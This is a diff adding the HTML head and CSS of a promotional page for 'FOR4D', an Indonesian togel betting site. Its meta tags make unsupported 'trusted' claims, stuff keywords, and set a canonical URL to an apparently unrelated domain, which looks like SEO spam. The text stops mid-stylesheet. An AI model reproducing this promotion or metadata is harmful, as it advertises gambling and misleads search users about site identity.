+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>FOR4D Resmi Toto 4D Terpercaya</title>
+    <link rel="amphtml" href="https://pub-78517327e88649ec9bc76a2f28edae38.r2.dev/amph14%20gruau.html" />
+    <meta name="description" content="FOR4D merupakan pilihan Situs Toto paling tepat sebagai pusat Bettingan togel, dengan mengutamakan rasa aman dan nyaman serta ketenangan para pemain." />
+    <meta name="keywords" content="situs togel online, bo togel terpercaya, toto togel, FOR4D, togel online, FOR4D toto, jp togel" />
+    <meta name="page google.com" content="https://www.google.com/search?q=FOR4D+toto">
+    <meta name="page google.co.id" content="https://www.google.co.id/search?q=FOR4D+toto">
+    <meta name="page google.com" content="https://www.google.com/search?q=FOR4D">
+    <meta name="page google.co.id" content="https://www.google.co.id/search?q=FOR4D">
+    <link itemprop="mainEntityOfPage" rel="canonical" href="https://www.gruau-algerie.com/" />
+    <meta name="robots" content="index, follow" />
+    <meta name="page-locale" content="id,en">
+    <meta content="true" name="HandheldFriendly">
+    <meta content="width" name="MobileOptimized">
+    <meta content="indonesian" name="language">
+    <meta content='#007fa0' name='theme-color' />
+    <link rel="preload" as="image" href="https://res.cloudinary.com/dnromfcqt/image/upload/v1731525615/Untitled-2_ibacyu.jpg" />
+    <meta name="supported-amp-formats" content="websites,stories,ads,email">
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="FOR4D Resmi Toto 4D Terpercaya">
+    <meta name="twitter:description" content="FOR4D merupakan pilihan Situs Toto paling tepat sebagai pusat Bettingan togel, dengan mengutamakan rasa aman dan nyaman serta ketenangan para pemain.">
+    <meta name="twitter:image:src" content="https://res.cloudinary.com/dnromfcqt/image/upload/v1731525615/Untitled-2_ibacyu.jpg">
+    <meta name="twitter:player" content="https://youtu.be/">
+    <meta name="og:title" content="FOR4D Resmi Toto 4D Terpercaya">
+    <meta name="og:description" content="FOR4D merupakan pilihan Situs Toto paling tepat sebagai pusat Bettingan togel, dengan mengutamakan rasa aman dan nyaman serta ketenangan para pemain.">
+    <meta name="og:image" content="https://res.cloudinary.com/dnromfcqt/image/upload/v1731525615/Untitled-2_ibacyu.jpg">
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="466">
+    <meta name="og:url" content="https://www.gruau-algerie.com/">
+    <meta name="og:site_name" content="FOR4D">
+    <meta name="og:locale" content="ID_id">
+    <meta name="og:video" content="https://youtu.be/">
+    <meta name="og:type" content="website">
+    <meta property="og:type" content="video" />
+    <meta property="og:video:type" content="video/mp4">
+    <meta property="og:video:width" content="500">
+    <meta property="og:video:height" content="281">
+    <meta name="theme-color" content="#0a0a0a" />
+    <meta name="categories" content="Togel Online" />
+    <meta name="language" content="ID">
+    <meta name="rating" content="general">
+    <meta name="copyright" content="FOR4D">
+    <meta name="author" content="FOR4D">
+    <meta name="distribution" content="global">
+    <meta name="publisher" content="FOR4D">
+    <meta name="geo.placename" content="DKI Jakarta">
+    <meta name="geo.country" content="ID">
+    <meta name="geo.region" content="ID" />
+    <meta name="tgn.nation" content="Indonesia">
+    <meta name="google-site-verification" content="JRejiadg5e32Nf6Py6JHgNYYblmy86SJLL02AWzSTdI" />
+    <meta name="google-site-verification" content="JRejiadg5e32Nf6Py6JHgNYYblmy86SJLL02AWzSTdI" />
+    <link rel="shortcut icon" type="image/x-icon" href="https://res.cloudinary.com/dnromfcqt/image/upload/v1730576624/AFOR4D_LOGO_CIRCLE_cuaglq.png" />
+    <link href='https://res.cloudinary.com/dnromfcqt/image/upload/v1730576624/AFOR4D_LOGO_CIRCLE_cuaglq.png' rel='icon' sizes='32x32' type='image/png' />
+    <style amp-runtime i-amphtml-version="012107240354000">
+        html.i-amphtml-fie {
+          height: 100% !important;
+          width: 100% !important
+        }
+  
+        html:not([amp4ads]),
+        html:not([amp4ads]) body {
+          height: auto !important
+
+        }
+  
+        html:not([amp4ads]) body {
+          margin: 0 !important
+        }
+  
+        body {
+          -webkit-text-size-adjust: 100%;
+          -moz-text-size-adjust: 100%;
+          -ms-text-size-adjust: 100%;
+          text-size-adjust: 100%
+        }
+  
+        html.i-amphtml-singledoc.i-amphtml-embedded {
+          -ms-touch-action: pan-y pinch-zoom;
+          touch-action: pan-y pinch-zoom
+        }
+  
+        html.i-amphtml-fie>body,
+        html.i-amphtml-singledoc>body {
+          overflow: visible !important
+        }
+  
+        html.i-amphtml-fie:not(.i-amphtml-inabox)>body,
+        html.i-amphtml-singledoc:not(.i-amphtml-inabox)>body {
+          position: relative !important
+        }
+  
+        html.i-amphtml-ios-embed-legacy>body {
+          overflow-x: hidden !important;
+          overflow-y: auto !important;
+          position: absolute !important
+        }
+  
+        html.i-amphtml-ios-embed {
+          overflow-y: auto !important;
+          position: static
+        }
+  
+        #i-amphtml-wrapper {
+          overflow-x: hidden !important;
+          overflow-y: auto !important;
+          position: absolute !important;
+          top: 0 !important;
+          left: 0 !important;
+          right: 0 !important;
+          bottom: 0 !important;
+          margin: 0 !important;
+          display: block !important
+        }
+  
+        html.i-amphtml-ios-embed.i-amphtml-ios-overscroll,
+        html.i-amphtml-ios-embed.i-amphtml-ios-overscroll>#i-amphtml-wrapper {
+          -webkit-overflow-scrolling: touch !important
+        }
+  
+        #i-amphtml-wrapper>body {
+          position: relative !important;
+          border-top: 1px solid transparent !important
+        }
+  
+        #i-amphtml-wrapper+body {
+          visibility: visible
+        }
+  
+        #i-amphtml-wrapper+body .i-amphtml-lightbox-element,
+        #i-amphtml-wrapper+body[i-amphtml-lightbox] {
+          visibility: hidden
+        }
+  
+        #i-amphtml-wrapper+body[i-amphtml-lightbox] .i-amphtml-lightbox-element {
+          visibility: visible
+        }
+  
+        #i-amphtml-wrapper.i-amphtml-scroll-disabled,
+        .i-amphtml-scroll-disabled {
+          overflow-x: hidden !important;
+          overflow-y: hidden !important
+        }
+  
+        amp-instagram {
+          padding: 54px 0 0 !important;
+          background-color: #fff
+        }
+  
+        amp-iframe iframe {
+          box-sizing: border-box !important
+        }
+  
+        [amp-access][amp-access-hide] {
+          display: none
+        }
+  
+        [subscriptions-dialog],
+        body:not(.i-amphtml-subs-ready) [subscriptions-action],
+        body:not(.i-amphtml-subs-ready) [subscriptions-section] {
+          display: none !important
+        }
+  
+        amp-experiment,
+        amp-live-list>[update] {
+          display: none
+        }
+  
+        amp-list[resizable-children]>.i-amphtml-loading-container.amp-hidden {
+          display: none !important
+        }
+  
+        amp-list [fetch-error],
+        amp-list[load-more] [load-more-button],
+        amp-list[load-more] [load-more-end],
+        amp-list[load-more] [load-more-failed],
+        amp-list[load-more] [load-more-loading] {
+          display: none
+        }
+  
+        amp-list[diffable] div[role="list"] {
+          display: block
+        }
+  
+        amp-story-page,
+        amp-story[standalone] {
+          min-height: 1px !important;
+          display: block !important;
+          height: 100% !important;
+          margin: 0 !important;
+          padding: 0 !important;
+          overflow: hidden !important;
+          width: 100% !important
+        }
+  
+        amp-story[standalone] {background-color: #202125 !important;
+          position: relative !important
+        }
+  
+        amp-story-page {
+          background-color: #757575
+        }
+  
+        amp-story .amp-active>div,amp-story .i-amphtml-loader-background {
+          display: none !important
+        }
+  
+        amp-story-page:not(:first-of-type):not([distance]):not([active]) {
+          transform: translateY(1000vh) !important
+        }amp-autocomplete {position: relative !important;
+          display: inline-block !important
+        }
+  
+        amp-autocomplete>input,
+        amp-autocomplete>textarea {
+          padding: .5rem;
+          border: 1px solidrgba(0, 0, 0, .33)
+        }
+  
+        .i-amphtml-autocomplete-results,
+        amp-autocomplete>input,
+        amp-autocomplete>textarea {
+          font-size: 1rem;
+          line-height: 1.5rem
+        }
+  
+        [amp-fx^="fly-in"] {
+          visibility: hidden
+        }
+  
+        amp-script[nodom],
+        amp-script[sandboxed] {
+          position: fixed !important;
+          top: 0 !important;
+          width: 1px !important;
+          height: 1px !important;
+          overflow: hidden !important;
+          visibility: hidden
+        }
+  
+        [hidden] {
+          display: none !important
+        }
+  
+        .i-amphtml-element {
+          display: inline-block
+        }
+  
+        .i-amphtml-blurry-placeholder {
+          transition: opacity .3s cubic-bezier(0, 0, .2, 1) !important;
+          pointer-events: none
+        }
+  
+        [layout=nodisplay]:not(.i-amphtml-element) {
+          display: none !important
+        }
+  
+        .i-amphtml-layout-fixed,
+        [layout=fixed][width][height]:not(.i-amphtml-layout-fixed) {
+          display: inline-block;
+          position: relative
+        }
+  
+        .i-amphtml-layout-responsive,
+        [layout=responsive][width][height]:not(.i-amphtml-layout-responsive),
+        [width][height][heights]:not([layout]):not(.i-amphtml-layout-responsive),
+        [width][height][sizes]:not(img):not([layout]):not(.i-amphtml-layout-responsive) {
+          display: block;
+          position: relative
+        }
+  
+        .i-amphtml-layout-intrinsic,
+        [layout=intrinsic][width][height]:not(.i-amphtml-layout-intrinsic) {
+          display: inline-block;
+          position: relative;
+          max-width: 100%
+        }
+  
+        .i-amphtml-layout-intrinsic .i-amphtml-sizer {
+          max-width: 100%
+        }
+  
+        .i-amphtml-intrinsic-sizer {
+          max-width: 100%;
+          display: block !important
+        }
+  
+        .i-amphtml-layout-container,
+        .i-amphtml-layout-fixed-height,
+        [layout=container],
+        [layout=fixed-height][height]:not(.i-amphtml-layout-fixed-height) {
+          display: block;
+          position: relative
+        }
+  
+        .i-amphtml-layout-fill,
+        .i-amphtml-layout-fill.i-amphtml-notbuilt,
+        [layout=fill]:not(.i-amphtml-layout-fill),
+        body noscript>* {
+          display: block;
+          overflow: hidden !important;
+          position: absolute;
+          top: 0;
+          left: 0;
+          bottom: 0;
+          right: 0
+        }
+  
+        body noscript>* {
+          position: absolute !important;
+          width: 100%;
+          height: 100%;
+          z-index: 2
+        }
+  
+        body noscript {
+          display: inline !important
+        }
+  
+        .i-amphtml-layout-flex-item,
+        [layout=flex-item]:not(.i-amphtml-layout-flex-item) {
+          display: block;
+          position: relative;
+          -ms-flex: 1 1 auto;
+          flex: 1 1 auto
+        }
+  
+        .i-amphtml-layout-fluid {
+          position: relative
+        }
+  
+        .i-amphtml-layout-size-defined {
+          overflow: hidden !important
+        }
+  
+        .i-amphtml-layout-awaiting-size {
+          position: absolute !important;
+          top: auto !important;
+          bottom: auto !important
+        }
+  
+        i-amphtml-sizer {
+          display: block !important
+        }
+  
+        @supports (aspect-ratio:1/1) {
+          i-amphtml-sizer.i-amphtml-disable-ar {
+            display: none !important
+          }
+        }
+  
+        .i-amphtml-blurry-placeholder,
+        .i-amphtml-fill-content {
+          display: block;
+          height: 0;
+          max-height: 100%;
+          max-width: 100%;
+          min-height: 100%;
+          min-width: 100%;
+          width: 0;
+          margin: auto
+        }
+  
+        .i-amphtml-layout-size-defined .i-amphtml-fill-content {
+          position: absolute;
+          top: 0;
+          left: 0;
+          bottom: 0;
+          right: 0
+        }
+  
+        .i-amphtml-replaced-content,
+        .i-amphtml-screen-reader {
+          padding: 0 !important;
+          border: none !important
+        }
+  
+        .i-amphtml-screen-reader {
+          position: fixed !important;
+          top: 0 !important;
+          left: 0 !important;
+          width: 4px !important;
+          height: 4px !important;
+          opacity: 0 !important;
+          overflow: hidden !important;
+          margin: 0 !important;
+          display: block !important;
+          visibility: visible !important
+        }
+  
+        .i-amphtml-screen-reader~.i-amphtml-screen-reader {
+          left: 8px !important
+        }
+  
+        .i-amphtml-screen-reader~.i-amphtml-screen-reader~.i-amphtml-screen-reader {
+          left: 12px !important
+        }
+  
+        .i-amphtml-screen-reader~.i-amphtml-screen-reader~.i-amphtml-screen-reader~.i-amphtml-screen-reader {
+          left: 16px !important
+        }
+  
+        .i-amphtml-unresolved {
+          position: relative;
+          overflow: hidden !important
+        }
+  
+        .i-amphtml-select-disabled {
+          -webkit-user-select: none !important;
+          -ms-user-select: none !important;
+          user-select: none !important
+        }
+  
+        .i-amphtml-notbuilt,
+        [layout]:not(.i-amphtml-element),
+        [width][height][heights]:not([layout]):not(.i-amphtml-element),
+        [width][height][sizes]:not(img):not([layout]):not(.i-amphtml-element) {
+          position: relative;
+          overflow: hidden !important;
+          color: transparent !important
+        }
+  
+        .i-amphtml-notbuilt:not(.i-amphtml-layout-container)>*,
+        [layout]:not([layout=container]):not(.i-amphtml-element)>*,
+        [width][height][heights]:not([layout]):not(.i-amphtml-element)>*,
+        [width][height][sizes]:not([layout]):not(.i-amphtml-element)>* {
+          display: none
+        }
+  
+        amp-img:not(.i-amphtml-element)[i-amphtml-ssr]>img.i-amphtml-fill-content {
+          display: block
+        }
+  
+        .i-amphtml-notbuilt:not(.i-amphtml-layout-container),
+        [layout]:not([layout=container]):not(.i-amphtml-element),
+        [width][height][heights]:not([layout]):not(.i-amphtml-element),
+        [width][height][sizes]:not(img):not([layout]):not(.i-amphtml-element) {
+          color: transparent !important;
+          line-height: 0 !important
+        }
+  
+        .i-amphtml-ghost {
+          visibility: hidden !important
+        }
+  
+        .i-amphtml-element>[placeholder],
+        [layout]:not(.i-amphtml-element)>[placeholder],
+        [width][height][heights]:not([layout]):not(.i-amphtml-element)>[placeholder],
+        [width][height][sizes]:not([layout]):not(.i-amphtml-element)>[placeholder] {
+          display: block;
+          line-height: normal
+        }
+  
+        .i-amphtml-element>[placeholder].amp-hidden,
+        .i-amphtml-element>[placeholder].hidden {
+          visibility: hidden
+        }
+  
+        .i-amphtml-element:not(.amp-notsupported)>[fallback],
+        .i-amphtml-layout-container>[placeholder].amp-hidden,
+        .i-amphtml-layout-container>[placeholder].hidden {
+          display: none
+        }
+  
+        .i-amphtml-layout-size-defined>[fallback],
+        .i-amphtml-layout-size-defined>[placeholder] {position: absolute !important;
+          top: 0 !important;
+          left: 0 !important;
+          right: 0 !important;
+          bottom: 0 !important;
+          z-index: 1
+        }
+  
+        amp-img.i-amphtml-ssr:not(.i-amphtml-element)>[placeholder] {
+          z-index: auto
+        }
+  
+        .i-amphtml-notbuilt>[placeholder] {
+          display: block !important
+        }
+  
+        .i-amphtml-hidden-by-media-query {
+          display: none !important
+        }
+  
+        .i-amphtml-element-error {
+          background: green !important;
+          color: #fff !important;
+          position: relative !important
+        }
+  
+        .i-amphtml-element-error:before {content: attr(error-message)
+        }
+  
+        i-amp-scroll-container,
+        i-amphtml-scroll-container {
+          position: absolute;
+          top: 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          display: block
+        }i-amp-scroll-container.amp-active,
+        i-amphtml-scroll-container.amp-active {
+          overflow: auto;
+          -webkit-overflow-scrolling: touch
+        }
+  
+        .i-amphtml-loading-container {
+          display: block !important;
+          pointer-events: none;
+          z-index: 1
+        }
+  
+        .i-amphtml-notbuilt>.i-amphtml-loading-container {
+          display: block !important
+        }
+  
+        .i-amphtml-loading-container.amp-hidden {
+          visibility: hidden
+        }
+  
+        .i-amphtml-element>[overflow] {
+          cursor: pointer;
+          position: relative;
+          z-index: 2;
+          visibility: hidden;
+          display: initial;
+          line-height: normal
+        }
+  
+        .i-amphtml-layout-size-defined>[overflow] {
+          position: absolute
+        }
+  
+        .i-amphtml-element>[overflow].amp-visible {
+          visibility: visible
+        }
+  
+        template {
+          display: none !important
+        }
+  
+        .amp-border-box,
+        .amp-border-box *,
+        .amp-border-box :after,
+        .amp-border-box :before {
+          box-sizing: border-box
+        }
+  
+        amp-pixel {
+          display: none !important
+        }
+  
+        amp-analytics,
+        amp-auto-ads,
+        amp-story-auto-ads {
+          position: fixed !important;
+          top: 0 !important;
+          width: 1px !important;
+          height: 1px !important;
+          overflow: hidden !important;
+          visibility: hidden
+        }
+  
+        html.i-amphtml-fie>amp-analytics {
+          position: initial !important
+        }
+  
+        [visible-when-invalid]:not(.visible),
+        form [submit-error],
+        form [submit-success],
+        form [submitting] {
+          display: none
+        }
+  
+        amp-accordion {
+          display: block !important
+        }
+  
+        @media (min-width:1px) {
+          :where(amp-accordion>section)>:first-child {
+            margin: 0;
+            background-color: #efefef;
+            padding-right: 20px;
+            border: 1px solid #dfdfdf
+          }
+  
+          :where(amp-accordion>section)>:last-child {
+            margin: 0
+          }
+        }
+  
+        amp-accordion>section {
+          float: none !important
+        }
+  
+        amp-accordion>section>* {
+          float: none !important;
+          display: block !important;
+          overflow: hidden !important;
+          position: relative !important
+        }
+  
+        amp-accordion,
+        amp-accordion>section {
+          margin: 0
+        }
+  
+        amp-accordion:not(.i-amphtml-built)>section>:last-child {
+          display: none !important
+        }
+  
+        amp-accordion:not(.i-amphtml-built)>section[expanded]>:last-child {
+          display: block !important
+        }
+      </style>
+      <script data-auto async src="https://cdn.ampproject.org/v0.mjs" type="module" crossorigin="anonymous"></script>
+      <script async nomodule src="https://cdn.ampproject.org/v0.js" crossorigin="anonymous"></script>
+      <script async src="https://cdn.ampproject.org/v0/amp-carousel-0.1.mjs" custom-element="amp-carousel" type="module" crossorigin="anonymous"></script>
+      <script async nomodule src="https://cdn.ampproject.org/v0/amp-carousel-0.1.js" crossorigin="anonymous" custom-element="amp-carousel"></script>
+      <script async src="https://cdn.ampproject.org/v0/amp-install-serviceworker-0.1.mjs" custom-element="amp-install-serviceworker" type="module" crossorigin="anonymous"></script>
+      <script async nomodule src="https://cdn.ampproject.org/v0/amp-install-serviceworker-0.1.js" crossorigin="anonymous" custom-element="amp-install-serviceworker"></script>
+      <script async src="https://cdn.ampproject.org/v0/amp-youtube-0.1.mjs" custom-element="amp-youtube" type="module" crossorigin="anonymous"></script>
+      <script async nomodule src="https://cdn.ampproject.org/v0/amp-youtube-0.1.js" crossorigin="anonymous" custom-element="amp-youtube"></script>
+      <script async src="https://cdn.ampproject.org/v0/amp-accordion-0.1.mjs" custom-element="amp-accordion" type="module" crossorigin="anonymous"></script>
+      <script async nomodule src="https://cdn.ampproject.org/v0/amp-accordion-0.1.js" crossorigin="anonymous" custom-element="amp-accordion"></script>
+      <style amp-custom>
+        body {
+          -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+          -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+          -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+          animation: -amp-start 8s steps(1, end) 0s 1 normal both
+        }
+  
+        @-webkit-keyframes -amp-start {
+          from {
+            visibility: hidden
+          }
+  
+          to {
+            visibility: visible
+          }
+        }
+  
+        @-moz-keyframes -amp-start {
+          from {
+            visibility: hidden
+          }
+  
+          to {
+            visibility: visible
+          }
+        }
+  
+        @-ms-keyframes -amp-start {
+          from {
+            visibility: hidden
+          }
+  
+          to {
+            visibility: visible
+          }
+        }
+  
+        @-o-keyframes -amp-start {
+          from {
+            visibility: hidden
+          }
+  
+          to {
+            visibility: visible
+          }
+        }
+  
+        @keyframes -amp-start {
+          from {
+            visibility: hidden
+          }
+  
+          to {
+            visibility: visible
+          }
+        }
+  
+        html {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          -webkit-text-size-adjust: 100%;
+          -ms-text-size-adjust: 100%
+        }
+  
+        a,
+        body,
+        div,
+        h1,
+        h2,
+        h3,
+        h4,
+        html,
+        p,
+        span {
+          margin: 0;
+          padding: 0;
+          border: 0;
+          font-size: 100%;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          vertical-align: baseline
+        }
+  
+        a,
+        a:active,
+        a:focus {
+          outline: 0;
+          text-decoration: none
+        }
+  
+        a {
+          color: #fff
+        }
+  
+        * {
+          padding: 0;
+          margin: 0;
+          -moz-box-sizing: border-box;
+          -webkit-box-sizing: border-box;
+          box-sizing: border-box
+        }
+  
+        h1,
+        h2,
+        h3,
+        h4 {
+          margin-top: 0;
+          margin-bottom: .5rem
+        }
+  
+        p {
+          margin: 0 0 10px
+        }
+  
+        p {
+          margin-top: 0;
+          margin-bottom: 1rem
+        }
+  
+        .clear {
+          clear: both
+        }
+  
+        .acenter {
+          text-align: center
+        }
+  
+        body {
+          background-color: #020202
+        }
+  
+        .container {
+          padding-right: 15px;
+          padding-left: 15px;margin-right: auto;
+          margin-left: auto
+        }
+  
+        .btn {
+          display: inline-block;
+          padding: 6px 12px;
+          touch-action: manipulation;
+          cursor: pointer;
+          user-select: none;
+          background-image: none;
+
+          border: 1px solid transparent;
+          border-radius: 5px;
+          font: 250 16px Arial, "Helvetica Neue", Helvetica, sans-serif;
+          width: 100%;
+          color: #fff;
+          text-shadow: 0 0 3px #000;
+          letter-spacing: 1.1px
+        }
+  
+        @keyframes blinking {
+          0% {
+            border: 2px solid #fff
+          }
+  
+          100% {
+            border: 2px solid #ff0000
+          }
+        }
+  
+        @media (min-width:768px) {
+          .container {
+            max-width: 720px}.tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 10px 20px 10px 0
+          }}
+  
+        @media (min-width:992px) {
+          .container {
+            max-width: 960px
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }.tron-login {
+            margin: 0 10px 0 0
+          }
+        }@media (min-width:1200px) {
+          .container {
+            width: 1000px
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 0 10px 0 0
+          }
+        }
+  
+        .row {
+          display: -ms-flexbox;
+          display: flex;
+          -ms-flex-wrap: wrap;
+          flex-wrap: wrap;
+          margin-right: -15px;
+          margin-left: -15px
+        }
+  
+        .p-0 {
+          padding: 0
+        }
+  
+        .col-md-12,
+        .col-md-4,
+        .col-md-6,
+        .col-md-8,
+        .col-xs-6 {
+          position: relative;
+          width: 100%;
+          padding-right: 15px;
+          padding-left: 15px
+        }
+  
+        .col-xs-6 {
+          float: left;
+          width: 50%
+        }
+  
+        @media (min-width:768px) {
+          .col-md-4 {
+            -ms-flex: 0 0 33.333333%;
+            flex: 0 0 33.333333%;
+            max-width: 33.333333%
+          }
+  
+          .col-md-6 {
+            -ms-flex: 0 0 50%;
+            flex: 0 0 50%;
+            max-width: 50%
+          }
+  
+          .col-md-8 {
+            -ms-flex: 0 0 66.666667%;
+            flex: 0 0 66.666667%;
+            max-width: 66.666667%
+          }
+  
+          .col-md-12 {
+            -ms-flex: 0 0 100%;
+            flex: 0 0 100%;
+            width: 100%
+          }
+  
+          .logomobi {
+            display: none
+          }
+  
+          .logform {
+            padding-top: 2rem
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 0 10px 0 0
+          }
+        }
+  
+        @media (max-width:768px) {
+          .logo {
+            display: none
+          }
+  
+          .navbar {
+            position: fixed
+          }
+  
+          .logomobi {
+            padding-top: 10px;
+            border-bottom: solid #ff0000 2px;
+            border-radius: 10px
+          }
+  
+          .content {
+            padding-top: 110px
+          }
+  
+          .logo {
+            display: none
+          }
+  
+          .tron-regis {
+            margin: 0 10px 0 0
+          }
+  
+          .tron-login {
+            margin: 0 10px 0 0
+          }
+        }
+  
+        .pb-2 {
+          padding-bottom: .5rem
+        }
+  
+        .paddy {
+          padding: 15px
+        }
+  
+        .mt-2 {
+          margin-top: .5rem
+        }
+  
+        .mtop {
+          margin-top: .75rem
+        }
+  
+        .mb-3 {
+          margin-bottom: .75rem
+        }
+  
+        .pb-5 {
+          padding-bottom: 1.25rem
+        }
+  
+        .pt-3 {
+          padding-top: 1rem
+        }
+  
+        .navbar {
+          background-color: #000;
+          right: 0;
+          left: 0;
+          z-index: 1030;
+          width: 100%;
+          float: left
+        }
+  
+        .bottom {
+          float: left;
+          width: 100%
+        }
+  
+        ul li {
+          list-style-type: none
+        }
+  
+        ul li:last-child {
+          border: 0
+        }
+  
+        .copyleft {
+          text-decoration: none;
+          color: #fff;
+          margin: 35px 0
+        }
+  
+        .copyleft a {
+          color: #ff0000
+        }
+  
+        .slide {
+          width: 100%;
+          border: 2px solid #ff0000;
+          border-radius: 4px;
+          box-shadow: 0 0 3px 0 #ff0000;
+        }
+  
+        .btn-daf {
+          margin: 30px 0 30px 0;
+          background: linear-gradient(#ff0000,#2b1b03);
+          animation: blinking 0.5s infinite;
+          transition: all .4s
+        }
+  
+        @keyframes blinking {
+          0% {
+            border: 3px solid #ffffff
+          }
+  
+          100% {
+            border: 3px solid #000000
+          }
+        }
+  
+        table.slot-gacor {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          width: 100%;
+          text-align: left;
+          border-collapse: collapse;
+          font-size: calc(8px+1vh);
+          margin: 0 20px 0 0
+        }
+  
+        table.slot-gacor td,
+        table.slot-gacor th {
+          border: 1px solid #ff0000;
+          padding: 10px 5px 10px
+        }
+  
+        table.slot-gacor tbody td {
+          font-size: calc(8px+1vh);
+          font-weight: 500;
+          color: #bfbfbf
+        }
+  
+        table.slot-gacor thead {
+          background: #ff0000
+        }
+  
+        table.slot-gacor thead th {
+          font-size: calc(12px+1vh);
+          font-weight: 700;
+          color: #fff;
+          text-align: center;
+          background: linear-gradient(#ff0000,#2b1b03);
+        }
+  
+        .main-menu-container {
+          aspect-ratio: 100 / 29;
+          margin: 0 10px 0 10px;
+          display: flex;
+          flex-wrap: wrap;
+          flex-basis: 100%;
+          background-color: #000;
+          color: #fff;
+          padding: 20px
+        }
+  
+        .main-menu-container ul>li {
+          display: inline;
+          padding: 0 8px
+        }
+  
+        .main-menu-container ul>li:last-child {
+          border: 0
+        }
+  
+        .main-menu-container>li {
+          flex-basis: 25%;
+          padding: 5px;
+          order: 2
+        }
+  
+        .main-menu-container>li:nth-child(-n+4) {
+          order: 0
+        }
+  
+        .main-menu-container>li>a {
+          display: block;
+          color: #fff;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(8px+1vh);
+          font-weight: 500;
+          border: 2px solid #ff0000;
+          border-radius: 5px;
+          padding: 30px;
+          text-align: center;
+          text-transform: uppercase;
+          background-color: #171717;
+          margin: 10px;
+          justify-content: center;
+          line-height: 20px
+        }
+  
+        .bank-menu-container {
+          margin: 10px 0 10px 0;
+          display: flex;
+          flex-wrap: wrap;
+          background-color: #000;
+          text-align: center
+        }
+  
+        .bank-menu-container>li {
+          flex-basis: 25%;
+          padding: 0 0 0 10px
+        }
+  
+        .bank-menu-container>li:nth-child(-n+4) {
+          order: 0
+        }
+  
+        .site-description {
+          text-align: left;
+          padding: 10px;
+          color: #ff0000;
+          border-radius: 5px;
+          box-shadow: 0 0 8px 4px #ff0000
+        }
+  
+        .site-description hr {
+          margin: 10px 0 10px 0;
+          color: #ff0000;
+          border: 1px solid #ff0000
+        }
+  
+        .site-description p {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: 16px;
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 400;
+          text-align: justify;
+          line-height: 23px;
+          padding: 0 10px;
+          color: #fff
+        }
+  
+        .site-description li {
+          margin: 5px 30px 10px;
+          text-align: justify;
+          color: #ff0000}
+  
+        .site-description ul>li>a {
+          color: #fff
+        }
+  
+        .site-description a {
+          color: #ff0000;
+        }
+  
+        .site-description h1 {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: 2em;
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 500;
+          color: #ff0000;
+          margin: 20px 0 20px 0;
+          text-align: center
+        }
+  
+        .site-description h2 {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: 1.7em;
+          font-style: normal;
+          font-variant: normal;font-weight: 500;line-height: 23px;
+          color: #ff0000;
+          margin: 20px 0 20px 0;text-align: center
+        }
+  
+        .site-description h3 {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: 1.4em;font-style: normal;
+          font-variant: normal;font-weight: 500;
+          line-height: 23px;
+          color: #ff0000;
+          margin: 20px 0 20px 0;
+          padding: 10px 10px 10px 10px
+        }
+  
+        .site-description h4 {
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: 1em;
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 500;
+          line-height: 23px;
+          color: #ffffff;
+          margin: 20px 0 20px 0;
+          padding: 10px
+        }
+  
+        .accordion h4 {
+          background-color: transparent;
+          border: 0
+        }
+  
+        .accordion h4 {
+          font-size: 17px;
+          line-height: 28px
+        }
+  
+        .accordion h4 i {
+          height: 40px;
+          line-height: 40px;
+          position: absolute;
+          right: 0;
+          font-size: 12px
+        }
+  
+        #sub_wrapper {
+          background: #685934;
+          max-width: 650px;
+          position: relative;
+          padding: 10px;
+          border-radius: 4px;
+          margin: 20px auto
+        }
+  
+        .tombol_toc {
+          position: relative;
+          outline: 0;
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(12px+1vh);
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 300;
+          line-height: 10px;
+          color: #fff
+        }
+  
+        .tombol_toc svg {
+          float: right
+        }
+  
+        #daftarisi {
+          background: #262626;
+          padding: 10px 10px 0;
+          border-radius: 4px;
+          margin-top: 10px;
+          -webkit-box-shadow: 0 2px 15px rgba(0, 0, 0, .05);
+          box-shadow: 0 2px 15px rgba(0, 0, 0, .05);
+          font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+          font-size: calc(8px+1vh);
+          font-style: normal;
+          font-variant: normal;
+          font-weight: 200;
+          line-height: 23px;
+          color: #ff0000
+        }
+  
+        #daftarisi a {
+          text-decoration: none;
+          color: #fff
+        }
+  
+        #daftarisi ol {
